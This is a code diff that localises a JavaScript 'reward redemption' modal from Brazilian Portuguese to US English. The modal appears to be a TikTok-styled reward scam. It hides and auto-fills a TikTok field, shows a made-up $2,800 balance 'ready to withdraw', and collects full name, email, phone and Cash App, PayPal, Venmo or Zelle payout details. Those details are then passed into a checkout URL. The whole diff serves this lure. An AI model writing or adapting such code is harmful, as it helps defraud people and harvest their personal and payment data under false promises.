@@ -1,10 +1,10 @@
-﻿// Runtime patch for the RedeemRewards modal (US localization):
+// Runtime patch for the RedeemRewards modal (US localization):
 // - Hide the "@yourusername" TikTok field and auto-fill it so validation passes
 // - Apply light input formatting for the payout key field based on selected method:
-//     Pix  -> ensure leading "$" (cashtag)
+//     Cash App  -> ensure leading "$" (cashtag)
 //     PayPal    -> lowercase, trim spaces (email)
 //     Venmo     -> ensure leading "@" (handle)
-//     Transferência     -> US phone mask (555) 555-5555 when numeric, otherwise pass-through email
+//     Zelle     -> US phone mask (555) 555-5555 when numeric, otherwise pass-through email
 (function () {
   if (window.__redeemPatchVersion === 15) return;
   window.__redeemPatchVersion = 15;
@@ -92,29 +92,29 @@
     overlay.innerHTML =
       "" +
       '<div style="width:100%;max-width:420px;background:#F5F5F5;border-radius:16px;overflow:hidden;margin-top:24px;box-shadow:0 20px 60px rgba(0,0,0,0.3);">' +
-      '<img src="/checkout-balance-banner.webp" alt="Saldo disponível de R$2.800,00 pronto para saque" style="display:block;width:100%;height:auto;background:#05080c;" />' +
+      '<img src="/checkout-balance-banner.webp" alt="Available balance $2,800.00 ready to withdraw" style="display:block;width:100%;height:auto;background:#05080c;" />' +
       '<div style="padding:22px 20px 24px;">' +
       '<div style="display:flex;justify-content:center;margin-bottom:16px;">' +
-      '<div style="background:#fff;border-radius:999px;padding:8px 18px;font-size:11px;font-weight:800;letter-spacing:1.5px;color:#111;">CONFIRMAÇÃO</div>' +
+      '<div style="background:#fff;border-radius:999px;padding:8px 18px;font-size:11px;font-weight:800;letter-spacing:1.5px;color:#111;">CONFIRMATION</div>' +
       "</div>" +
 
-      '<h2 style="margin:0 0 8px;font-size:18px;font-weight:800;color:#111;text-align:center;line-height:1.3;">Confirme seus dados</h2>' +
-      '<p style="margin:0 0 18px;font-size:13px;color:#6b6b6b;text-align:center;line-height:1.4;">Verifique suas informações abaixo para liberar sua recompensa.</p>' +
+      '<h2 style="margin:0 0 8px;font-size:18px;font-weight:800;color:#111;text-align:center;line-height:1.3;">Confirm your details</h2>' +
+      '<p style="margin:0 0 18px;font-size:13px;color:#6b6b6b;text-align:center;line-height:1.4;">Verify your info below to release your reward.</p>' +
       '<div style="background:#fff;border-radius:14px;padding:18px 16px;">' +
-      '<label style="display:block;font-size:11px;font-weight:800;letter-spacing:1px;color:#6b7280;margin-bottom:6px;">NOME COMPLETO</label>' +
+      '<label style="display:block;font-size:11px;font-weight:800;letter-spacing:1px;color:#6b7280;margin-bottom:6px;">FULL NAME</label>' +
       '<input id="__cfName" type="text" autocomplete="name" style="width:100%;box-sizing:border-box;padding:12px 14px;border:1px solid #e5e7eb;border-radius:10px;font-size:15px;background:#fafafa;color:#111;margin-bottom:14px;outline:none;" />' +
-      '<label style="display:block;font-size:11px;font-weight:800;letter-spacing:1px;color:#6b7280;margin-bottom:6px;">E-MAIL</label>' +
+      '<label style="display:block;font-size:11px;font-weight:800;letter-spacing:1px;color:#6b7280;margin-bottom:6px;">EMAIL</label>' +
       '<input id="__cfEmail" type="email" inputmode="email" autocomplete="email" style="width:100%;box-sizing:border-box;padding:12px 14px;border:1px solid #e5e7eb;border-radius:10px;font-size:15px;background:#fafafa;color:#111;margin-bottom:14px;outline:none;" />' +
       '<label style="display:block;font-size:11px;font-weight:800;letter-spacing:1px;color:#6b7280;margin-bottom:6px;">' +
-      (IS_VENDEPAY_TARGET ? "TELEFONE" : "CEP") +
+      (IS_VENDEPAY_TARGET ? "PHONE" : "ZIP CODE") +
       "</label>" +
       '<input id="__cfPhone" type="tel" inputmode="numeric" autocomplete="' +
       (IS_VENDEPAY_TARGET ? "tel" : "postal-code") +
       '" placeholder="' +
       (IS_VENDEPAY_TARGET ? "(555) 555-5555" : "10001") +
       '" style="width:100%;box-sizing:border-box;padding:12px 14px;border:1px solid #e5e7eb;border-radius:10px;font-size:15px;background:#fafafa;color:#111;margin-bottom:16px;outline:none;" />' +
-      '<button id="__cfSubmit" type="button" style="width:100%;padding:14px;border:0;border-radius:10px;background:#FE2C55;color:#fff;font-weight:800;font-size:15px;letter-spacing:1px;cursor:pointer;">CONFIRMAR E LIBERAR</button>' +
-      '<p style="margin:10px 0 0;font-size:11px;color:#9ca3af;text-align:center;line-height:1.4;">Suas informações estão seguras e serão usadas apenas para processar sua recompensa.</p>' +
+      '<button id="__cfSubmit" type="button" style="width:100%;padding:14px;border:0;border-radius:10px;background:#FE2C55;color:#fff;font-weight:800;font-size:15px;letter-spacing:1px;cursor:pointer;">CONFIRM &amp; RELEASE</button>' +
+      '<p style="margin:10px 0 0;font-size:11px;color:#9ca3af;text-align:center;line-height:1.4;">Your information is secure and will only be used to process your reward.</p>' +
       "</div>" +
       "</div>" +
       "</div>";
@@ -166,7 +166,7 @@
       }
 
       btn.disabled = true;
-      btn.textContent = "PROCESSANDO...";
+      btn.textContent = "PROCESSING...";
       btn.style.opacity = "0.85";
       const finalUrl = buildCheckoutUrl(targetUrl, name, email, phone);
       const navigateTo = finalUrl;
@@ -259,14 +259,14 @@
       sticky.id = "__stickyReleaseCta";
       sticky.setAttribute("aria-hidden", "true");
       const balanceMatch = (originalButton.textContent || "").match(/\$[\d,.]+/);
-      const balance = balanceMatch?.[0] || "R$2.800,00";
+      const balance = balanceMatch?.[0] || "$2,800.00";
       sticky.innerHTML = `
         <div class="__stickyReleaseInner">
-          <div class="__stickyReleaseSaldo">
-            <span>Seu saldo</span>
+          <div class="__stickyReleaseBalance">
+            <span>Your balance</span>
             <strong>${balance}</strong>
           </div>
-          <button type="button">LIBERAR</button>
+          <button type="button">RELEASE</button>
         </div>
       `;
       const stickyButton = sticky.querySelector("button");
@@ -305,17 +305,17 @@
             justify-content: space-between;
             gap: 18px;
           }
-          #__stickyReleaseCta .__stickyReleaseSaldo {
+          #__stickyReleaseCta .__stickyReleaseBalance {
             display: flex;
             min-width: 0;
             flex-direction: column;
             color: #111827;
           }
-          #__stickyReleaseCta .__stickyReleaseSaldo span {
+          #__stickyReleaseCta .__stickyReleaseBalance span {
             font: 500 12px/1.2 Inter, system-ui, sans-serif;
             color: #6b7280;
           }
-          #__stickyReleaseCta .__stickyReleaseSaldo strong {
+          #__stickyReleaseCta .__stickyReleaseBalance strong {
             margin-top: 3px;
             font: 800 21px/1.1 Inter, system-ui, sans-serif;
             white-space: nowrap;
@@ -350,7 +350,7 @@
           }
           @media (max-width: 360px) {
             #__stickyReleaseCta .__stickyReleaseInner { gap: 12px; }
-            #__stickyReleaseCta .__stickyReleaseSaldo strong { font-size: 18px; }
+            #__stickyReleaseCta .__stickyReleaseBalance strong { font-size: 18px; }
             #__stickyReleaseCta button {
               min-width: 126px;
               padding-inline: 18px;
@@ -614,7 +614,7 @@
     return stripped.startsWith("@") ? stripped : `@${stripped.replace(/^@+/, "")}`;
   }
 
-  function maskTransferência(v) {
+  function maskZelle(v) {
     const trimmed = v.trim();
     // If it looks like it has letters or "@", treat as email
     if (/[a-zA-Z@]/.test(trimmed)) return maskEmail(trimmed);
@@ -647,7 +647,7 @@
     if (ph.includes("venmo") || ph.startsWith("@your-venmo")) return "venmo";
     if (ph.includes("555-5555") || ph.includes("email or (")) return "zelle";
     const wrapperText = (input.closest("div")?.parentElement?.textContent || "").toLowerCase();
-    if (wrapperText.includes("dados de pagamento") || wrapperText.includes("payout"))
+    if (wrapperText.includes("payment details") || wrapperText.includes("payout"))
       return selectedKeyTypeFromButtons();
     return null;
   }
@@ -656,7 +656,7 @@
     if (type === "cashapp") return maskCashtag(value);
     if (type === "paypal") return maskEmail(value);
     if (type === "venmo") return maskVenmo(value);
-    if (type === "zelle") return maskTransferência(value);
+    if (type === "zelle") return maskZelle(value);
     return value;
   }
 
